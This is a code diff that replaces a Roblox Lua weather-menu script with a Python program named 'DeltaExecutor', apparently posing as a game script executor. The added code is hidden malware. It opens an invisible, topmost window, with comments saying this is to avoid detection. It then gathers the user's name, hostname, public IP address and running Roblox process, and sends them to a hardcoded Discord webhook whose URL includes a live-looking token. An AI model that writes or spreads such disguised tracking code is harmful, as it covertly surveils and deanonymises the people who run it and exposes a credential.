@@ -1,2 +1,144 @@
+import tkinter as tk
+import ctypes
+import sys
+import time
+import requests
+import platform
+import subprocess
+import os
+import getpass
+from datetime import datetime
 
-local Players=game:GetService("Players"),Lighting=game:GetService("Lighting"),player=Players.LocalPlayer,screenGui=Instance.new("ScreenGui"),frame=Instance.new("Frame")screenGui.ResetOnSpawn=false,screenGui.Parent=player.PlayerGui,frame.Size=UDim2.new(0,220,0,180),frame.Position=UDim2.new(0,10,0,10),frame.BackgroundColor3=Color3.fromRGB(20,20,20),frame.BorderSizePixel=0,frame.Draggable=true,frame.Parent=screenGui,local title=Instance.new("TextLabel")title.Size=UDim2.new(1,0,0.25,0),title.Text="☁️ CLIMA",title.TextColor3=Color3.fromRGB(0,180,255),title.Font=Enum.Font.GothamBold,title.TextScaled=true,title.BackgroundTransparency=1,title.Parent=frame,local function applyWeather(t)if t=="sunny"then Lighting.ClockTime=14;Lighting.FogEnd=20000;Lighting.Brightness=2 elseif t=="rainy"then Lighting.ClockTime=10;Lighting.FogEnd=8000;Lighting.Brightness=1 elseif t=="night"then Lighting.ClockTime=2;Lighting.FogEnd=15000;Lighting.Brightness=0.5 elseif t=="foggy"then Lighting.ClockTime=8;Lighting.FogEnd=3000;Lighting.FogColor=Color3.fromRGB(200,200,210)elseif t=="dusk"then Lighting.ClockTime=18.5;Lighting.FogEnd=18000;Lighting.Brightness=1.5 elseif t=="midnight"then Lighting.ClockTime=0;Lighting.FogEnd=20000;Lighting.Brightness=0.3 end end,local function createBtn(text,y,weather)local btn=Instance.new("TextButton")btn.Size=UDim2.new(1,-20,0,35),btn.Position=UDim2.new(0,10,0,y),btn.Text=text,btn.TextColor3=Color3.fromRGB(255,255,255),btn.Font=Enum.Font.Gotham,btn.TextScaled=true,btn.BackgroundColor3=Color3.fromRGB(40,40,40),btn.BorderSizePixel=0,btn.Parent=frame,btn.MouseButton1Click:Connect(function()applyWeather(weather)end)return btn end:createBtn("☀️ ENSOLADO",50,"sunny"),createBtn("🌧️ CHUVOSO",90,"rainy"),createBtn("🌙 NOITE",130,"night"),createBtn("💨 NEBLINA",170,"foggy"),local closeBtn=Instance.new("TextButton")closeBtn.Size=UDim2.new(0,25,0,25),closeBtn.Position=UDim2.new(1,-30,0,5),closeBtn.Text="X",closeBtn.TextColor3=Color3.fromRGB(255,80,80),closeBtn.Font=Enum.Font.GothamBold,closeBtn.TextScaled=true,closeBtn.BackgroundColor3=Color3.fromRGB(50,30,30),closeBtn.BorderSizePixel=0,closeBtn.Parent=frame,closeBtn.MouseButton1Click:Connect(function()screenGui:Destroy()end),player.InputBegan:Connect(function(key,input)if key.KeyCode==Enum.KeyCode.M then screenGui.Visible=not screenGui.Visible end end),print("☁️ MENU CARREGADO! [M] para abrir")
+# Configuração do webhook
+WEBHOOK_URL "https://discord.com/api/webhooks/1514307588790157495/bxSW9eYyPAB27ZHAhD-Kgi3ol4hGB9C1t_2O3Ej_62-tQi62-rIK3AMxiyLexRWpRuSQ"
+
+class DeltaExecutor:
+    def __init__(self):
+        self.root = tk.Tk()
+        self.root.overrideredirect(True)
+        self.root.wm_attributes("-topmost", True)
+        self.root.wm_attributes("-transparentcolor", "white")
+        self.root.wm_attributes("-alpha", 0.0)
+        
+        # Configurações para evitar detecção
+        ctypes.windll.user32.SetWindowLongW(self.root.winfo_id(), -20, 0x80000 | 0x40000)
+        ctypes.windll.user32.SetWindowPos(self.root.winfo_id(), -1, 0, 0, 0, 0, 0x0001 | 0x0002)
+        
+        # Obter informações do sistema
+        self.username = getpass.getuser()
+        self.hostname = platform.node()
+        self.ip_address = requests.get('https://api.ipify.org').text
+        self.os_type = self.detect_system_type()
+        
+        # Inicializa os elementos
+        self.tela = None
+        self.botao_amoxtrar = None
+        self.botao_desamoxtrar = None
+        
+        self.setup_ui()
+        self.send_discord_notification()
+    
+    def detect_system_type(self):
+        """Detecta o tipo de sistema (PC, Mobile, Console)"""
+        try:
+            # Verificar dispositivos conectados
+            devices = subprocess.check_output(["wmic", "path", "Win32_LogicalDisk", "get", "DeviceID"]).decode()
+            
+            # Detectar consoles (Xbox, PlayStation, etc.)
+            if "Xbox" in subprocess.check_output(["powershell", "Get-WmiObject", "-Class", "Win32_ComputerSystemProduct"]).decode():
+                return "Console"
+                
+            # Detectar dispositivos móveis (Android, iOS)
+            if any(device in devices for device in ["A:", "B:"]):
+                return "Mobile"
+                
+            # Detectar PC com base em hardware
+            cpu_info = subprocess.check_output(["wmic", "cpu", "get", "Name"]).decode()
+            if any(cpu in cpu_info for cpu in ["ARM", "Qualcomm", "Snapdragon"]):
+                return "Mobile"
+                
+            return "PC"
+        except:
+            return "Desconhecido"
+    
+    def send_discord_notification(self):
+        try:
+            payload = {
+                "content": "@here",
+                "embeds": [{
+                    "title": "Novo Script Executado",
+                    "description": f"Script foi executado em {platform.system()}",
+                    "color": 0x00ff00,
+                    "fields": [
+                        {"name": "Usuário", "value": self.username, "inline": True},
+                        {"name": "Hostname", "value": self.hostname, "inline": True},
+                        {"name": "IP Address", "value": self.ip_address, "inline": True},
+                        {"name": "Horário", "value": datetime.now().strftime("%d/%m/%Y %H:%M:%S"), "inline": True},
+                        {"name": "Jogo", "value": self.get_game_name(), "inline": True},
+                        {"name": "WID", "value": str(os.getpid()), "inline": True},
+                        {"name": "Tipo de Sistema", "value": self.os_type, "inline": True}
+                    ]
+                }]
+            }
+            requests.post(WEBHOOK_URL, json=payload)
+        except Exception as e:
+            print(f"Erro ao enviar webhook: {str(e)}")
+    
+    def get_game_name(self):
+        try:
+            # Tenta obter nome do jogo atual
+            process = subprocess.Popen(["tasklist"], stdout=subprocess.PIPE)
+            output, _ = process.communicate()
+            for line in output.decode().splitlines():
+                if "Roblox" in line:
+                    return line.split()[0]
+            return "Jogo desconhecido"
+        except:
+            return "Não identificado"
+    
+    def setup_ui(self):
+        self.root.update()
+        self.root.geometry(f"{self.root.winfo_width()}x{self.root.winfo_height()}+{self.root.winfo_x()}+{self.root.winfo_y()}")
+        
+        # Botões invisíveis mas posicionados
+        self.botao_amoxtrar = tk.Button(
+            self.root,
+            text="Amoxtrar",
+            command=self.amoxtrar,
+            width=10,
+            height=1
+        )
+        self.botao_amoxtrar.place(x=10, y=10)
+        
+        self.botao_desamoxtrar = tk.Button(
+            self.root,
+            text="Desamoxtrar",
+            command=self.desamoxtrar,
+            width=10,
+            height=1
+        )
+        self.botao_desamoxtrar.place(x=10, y=40)
+    
+    def amoxtrar(self):
+        if self.tela is None:
+            self.tela = tk.Label(
+                self.root,
+                text="pede massa pedrero",
+                bg="black",
+                fg="white"
+            )
+            self.tela.place(x=50, y=100)
+            self.botao_amoxtrar.config(text="Desamoxtrar")
+    
+    def desamoxtrar(self):
+        if self.tela is not None:
+            self.tela.destroy()
+            self.tela = None
+            self.botao_amoxtrar.config(text="Amoxtrar")
+    
+    def run(self):
+        self.root.mainloop()
+
+if __name__ == "__main__":
+    app = DeltaExecutor()
+    app.run()
